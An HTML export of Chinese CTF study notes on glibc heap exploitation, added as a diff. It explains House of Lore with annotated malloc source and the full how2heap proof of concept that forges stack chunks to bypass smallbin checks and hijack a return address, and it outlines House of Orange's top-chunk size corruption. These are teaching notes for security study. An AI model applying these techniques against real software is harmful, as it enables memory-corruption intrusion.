@@ -1,0 +1,289 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN13</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="3argi3ktaoe1veosam5fe19bsd">CTF PWN13</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="CTF PWN13_files/images/CTF PWN13.jpg"></div>
+<h2 class="topic">
+<a name="2vn0m6grepsginpfp9162hh7q9">堆溢出</a>
+</h2>
+<h3 class="topic">
+<a name="54rrld3p25egs3n0ljq809kuk6">&nbsp;House of Lore</a>
+</h3>
+<h3 class="topic">
+<a name="4r0uc2e51qda7v0slbsviolre0">&nbsp;&nbsp;概述</a>
+</h3>
+<h3 class="topic">
+<a name="2irai4slbm0bu18tj19m941rd0">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/1r97m8cpkm84j6tth2nldqf96t.png"></p>
+<h3 class="topic">
+<a name="6uc9n1h5i29cbfnds66ebkm413">&nbsp;&nbsp;攻击原理</a>
+</h3>
+<h3 class="topic">
+<a name="7culq0ug84qraibr2s475qmjai">&nbsp;&nbsp;&nbsp;如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</a>
+</h3>
+<h3 class="topic">
+<a name="4ks9at76aud43jbl8fd040j2og">&nbsp;&nbsp;&nbsp;&nbsp;    /*&#13;
+       If a small request, check regular bin.  Since these "smallbins"&#13;
+       hold one size each, no searching within bins is necessary.&#13;
+       (For a large request, we need to wait until unsorted chunks are&#13;
+       processed to find best fit. But for small ones, fits are exact&#13;
+       anyway, so we can check now, which is faster.)&#13;
+     */&#13;
+&#13;
+    if (in_smallbin_range(nb)) {&#13;
+        // 获取 small bin 的索引&#13;
+        idx = smallbin_index(nb);&#13;
+        // 获取对应 small bin 中的 chunk 指针&#13;
+        bin = bin_at(av, idx);&#13;
+        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk&#13;
+        // 如果 victim = bin ，那说明该 bin 为空。&#13;
+        // 如果不相等，那么会有两种情况&#13;
+        if ((victim = last(bin)) != bin) {&#13;
+            // 第一种情况，small bin 还没有初始化。&#13;
+            if (victim == 0) /* initialization check */&#13;
+                // 执行初始化，将 fast bins 中的 chunk 进行合并&#13;
+                malloc_consolidate(av);&#13;
+            // 第二种情况，small bin 中存在空闲的 chunk&#13;
+            else {&#13;
+                // 获取 small bin 中倒数第二个 chunk 。&#13;
+                bck = victim-&gt;bk;&#13;
+                // 检查 bck-&gt;fd 是不是 victim，防止伪造&#13;
+                if (__glibc_unlikely(bck-&gt;fd != victim)) {&#13;
+                    errstr = "malloc(): smallbin double linked list corrupted";&#13;
+                    goto errout;&#13;
+                }&#13;
+                // 设置 victim 对应的 inuse 位&#13;
+                set_inuse_bit_at_offset(victim, nb);&#13;
+                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来&#13;
+                bin-&gt;bk = bck;&#13;
+                bck-&gt;fd = bin;&#13;
+                // 如果不是 main_arena，设置对应的标志&#13;
+                if (av != &amp;main_arena) set_non_main_arena(victim);&#13;
+                // 细致的检查&#13;
+                check_malloced_chunk(av, victim, nb);&#13;
+                // 将申请到的 chunk 转化为对应的 mem 状态&#13;
+                void *p = chunk2mem(victim);&#13;
+                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff&#13;
+                alloc_perturb(p, bytes);&#13;
+                return p;&#13;
+            }&#13;
+        }&#13;
+    }</a>
+</h3>
+<h3 class="topic">
+<a name="0klns4na9fbpd0bbd6vi8liucg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/4i4m5et5stinlvhgk34704261c.png"></p>
+<h3 class="topic">
+<a name="1c74haaa8kbfris18ibckjfjgf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意整体来看，程序malloc(smallbin chunk)时，会先找到smallbin中最后一个chunk，然后根据最后一个chunk的bk指针找到倒数第二个chunk，检验导致数第二个chunk的fd指针是否指向倒数第一个chunk，如果检验通过，会修改smallbin，将最后一个chunk取出，然后将倒数第二个chunk作为smallbin最后一个chunk，等待下次申请时，将其作为堆内存使用，所以只要让最后一个chunk的bk指针指向fakechunk，并且保证fakechunk的fd指针指向最后一个chunk，就可以在最后一个chunk被申请出去之后，让fakechunk成为smallbin最后一个chunk，从而在下次malloc(smallbinchunk)时将fakechunk作为堆内存分配</a>
+</h3>
+<h3 class="topic">
+<a name="2c836v92gm59qv8q15qrvj2fai">&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="21bqlnkj79b017lpgkrer90pjg">&nbsp;&nbsp;&nbsp;示例代码（讲的很清楚）</a>
+</h3>
+<h3 class="topic">
+<a name="0bormhhc2o6ngsfuub0nl13dpp">&nbsp;&nbsp;&nbsp;&nbsp;#include &lt;stdio.h&gt;&#13;
+#include &lt;stdlib.h&gt;&#13;
+#include &lt;string.h&gt;&#13;
+#include &lt;stdint.h&gt;&#13;
+&#13;
+void jackpot(){ puts("Nice jump d00d"); exit(0); }&#13;
+&#13;
+int main(int argc, char * argv[]){&#13;
+&#13;
+&#13;
+  intptr_t* stack_buffer_1[4] = {0};&#13;
+  intptr_t* stack_buffer_2[3] = {0};&#13;
+&#13;
+  fprintf(stderr, "\nWelcome to the House of Lore\n");&#13;
+  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");&#13;
+  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");&#13;
+&#13;
+  fprintf(stderr, "Allocating the victim chunk\n");&#13;
+  intptr_t *victim = malloc(100);&#13;
+  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);&#13;
+&#13;
+  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk&#13;
+  intptr_t *victim_chunk = victim-2;&#13;
+&#13;
+  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);&#13;
+  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);&#13;
+&#13;
+  fprintf(stderr, "Create a fake chunk on the stack");&#13;
+  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"&#13;
+         "in second to the last malloc, which putting stack address on smallbin list\n");&#13;
+  stack_buffer_1[0] = 0;&#13;
+  stack_buffer_1[1] = 0;&#13;
+  stack_buffer_1[2] = victim_chunk;&#13;
+&#13;
+  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "&#13;
+         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "&#13;
+         "chunk on stack");&#13;
+  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;&#13;
+  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;&#13;
+&#13;
+  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"&#13;
+         "the small one during the free()\n");&#13;
+  void *p5 = malloc(1000);&#13;
+  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);&#13;
+&#13;
+&#13;
+  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);&#13;
+  free((void*)victim);&#13;
+&#13;
+  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");&#13;
+  fprintf(stderr, "victim-&gt;fwd: %p\n", (void *)victim[0]);&#13;
+  fprintf(stderr, "victim-&gt;bk: %p\n\n", (void *)victim[1]);&#13;
+&#13;
+  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");&#13;
+  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);&#13;
+&#13;
+  void *p2 = malloc(1200);&#13;
+  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);&#13;
+&#13;
+  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");&#13;
+  fprintf(stderr, "victim-&gt;fwd: %p\n", (void *)victim[0]);&#13;
+  fprintf(stderr, "victim-&gt;bk: %p\n\n", (void *)victim[1]);&#13;
+&#13;
+  //------------VULNERABILITY-----------&#13;
+&#13;
+  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n");&#13;
+&#13;
+  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack&#13;
+&#13;
+  //------------------------------------&#13;
+&#13;
+  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");&#13;
+  fprintf(stderr, "This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n");&#13;
+&#13;
+  void *p3 = malloc(100);&#13;
+&#13;
+&#13;
+  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n");&#13;
+  char *p4 = malloc(100);&#13;
+  fprintf(stderr, "p4 = malloc(100)\n");&#13;
+&#13;
+  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",&#13;
+         stack_buffer_2[2]);&#13;
+&#13;
+  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack&#13;
+  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode&#13;
+  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary&#13;
+}</a>
+</h3>
+<h3 class="topic">
+<a name="3lv2h5098v653v1qjsdhvghfmt">&nbsp;&nbsp;&nbsp;需要注意的点</a>
+</h3>
+<h3 class="topic">
+<a name="399v0fk3lghs18e9rs6c42toc3">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/3vdbk1li3arvn559r0h1mbf45u.png"></p>
+<h3 class="topic">
+<a name="6ma19vdqrpkh5jq2gcr338v5ad">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并且注意在将fakechunk的fd指针指向smallbinchunk的最后一个chunk的同时，也要使fakechunk的bk指针指向nextfakechunk，而nextfakechunk的fd指针也设置为指向fakechunk，这样的话才能在最后fakechunk被作为堆空间申请出去的时候绕过验证，示例中对应代码如右侧</a>
+</h3>
+<h3 class="topic">
+<a name="17bgr1ljn27fh91jfomm6tqj98">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  fprintf(stderr, "Create a fake chunk on the stack");&#13;
+  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"&#13;
+         "in second to the last malloc, which putting stack address on smallbin list\n");&#13;
+  stack_buffer_1[0] = 0;&#13;
+  stack_buffer_1[1] = 0;&#13;
+  stack_buffer_1[2] = victim_chunk;&#13;
+&#13;
+  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "&#13;
+         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "&#13;
+         "chunk on stack");&#13;
+  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;&#13;
+  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;</a>
+</h3>
+<h3 class="topic">
+<a name="0n85bgok49c79m9vir6rqjaihv">&nbsp;&nbsp;参考文献</a>
+</h3>
+<h3 class="topic">
+<a name="6bp1b0vlhb5it567sb0e9i407v">&nbsp;&nbsp;&nbsp;https://github.com/shellphish/how2heap/blob/master/house_of_lore.c</a>
+</h3>
+<h3 class="topic">
+<a name="37q4b6u6lfelur7ne0b91eamn8">&nbsp;House of Orange</a>
+</h3>
+<h3 class="topic">
+<a name="36k14a9c7qbjgpvcp7d3si8bbl">&nbsp;&nbsp;概述与介绍</a>
+</h3>
+<h3 class="topic">
+<a name="433ia27g1n1k4et9n1nj0d23e6">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/2b708ihu9ldn1e4he27as5mtkl.png"></p>
+<h3 class="topic">
+<a name="13d2jl8kl4f9grbcu32f2c74j5">&nbsp;&nbsp;&nbsp;&nbsp;主要思路是因为当malloc所申请size的大小过大，导致四种bins中都没有可以满足要求的chunk，并且topchunk也不能满足要求，所以程序会通过扩展堆空间(brk或mmap)方式满足此次内存申请请求，如果通过扩展堆空间的方式申请内存，则会将原本的topchunk链入unsorted bin中，当下一次申请内存时，就会从Unsorted bin中找到原来的topchunk，然后通过切割一部分原topchunk进行堆分配</a>
+</h3>
+<h3 class="topic">
+<a name="2nsad675ihe33sre7mcqq3jto8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由此可知关键是需要使得申请的字节数大于topchunk的大小，使得topchunk不能满足申请需求，这就要求通过漏洞修改topchunk的size字段，通过将该字段调整为小于申请的字节数，从而构建该攻击，当然为了绕过检测，这里将topchunk的size修改为何值存在一定约束</a>
+</h3>
+<h3 class="topic">
+<a name="3j9gioi8bhu4nis8j7mujfh3g6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此种攻击方式的利用涉及_IO_FILE相关知识</a>
+</h3>
+<h3 class="topic">
+<a name="6hd5dntqv73lrj0952sik0asht">&nbsp;&nbsp;原理</a>
+</h3>
+<h3 class="topic">
+<a name="3jjuj47hf55tpn3d1j5mhb818o">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/0ic4p5foqegdbgo3qbntp1f9ml.png"></p>
+<h3 class="topic">
+<a name="3mrcdfj6lpte30lmo5e9cbml15">&nbsp;&nbsp;&nbsp;&nbsp;一些需要绕过检验</a>
+</h3>
+<h3 class="topic">
+<a name="08e0llcq848on1h8n44ma5hiqc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;申请的内存不能超过 mp_.mmap_threshold（mmap 分配阈值，默认为 128K）</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/55qn81efe8fopnl3v2kd75g5os.png"></p>
+<h3 class="topic">
+<a name="5kub5vrs1a2usjvamlfeql9jeg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果要正确构造该攻击，需要使得topchunk的size满足以上四条要求</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/3qohnji4mmomnbdvirldkvec8b.png"></p>
+<h3 class="topic">
+<a name="5css2k9r0ldami0qvdo4etl9vl">&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="25iqdavgb4cftqc0vhnds4r241">&nbsp;&nbsp;&nbsp;错误示例</a>
+</h3>
+<h3 class="topic">
+<a name="4q5ole8lv6nvf8qg9g34u2l1oe">&nbsp;&nbsp;&nbsp;&nbsp;因为此处修改后的topchunk的size使得topchunk不能做到内存页对齐，即topchunk首地址+size的值不是0x1000（4kb）的整数倍</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/5bisrhhdcnr3kaesfhc6kh0821.png"></p>
+<h3 class="topic">
+<a name="5r2pqeob9n391go5l6mghrl39b">&nbsp;&nbsp;&nbsp;正确示例</a>
+</h3>
+<h3 class="topic">
+<a name="11dab8n7184o9gkbthbc943cgh">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/307k4c7s6pcomlj7sk984o6ofl.png"></p>
+<h3 class="topic">
+<a name="3l9bn47qjbsui967oklckg3r8r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/3gni0bu953upuu4t6fv33u5on1.png"></p>
+<h3 class="topic">
+<a name="26kvn54lb5355vlnls4d6ftpqs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN13_files/74l1g3vl26a6skls87jdegpbs7.png"></p>
+</body>
+</html>
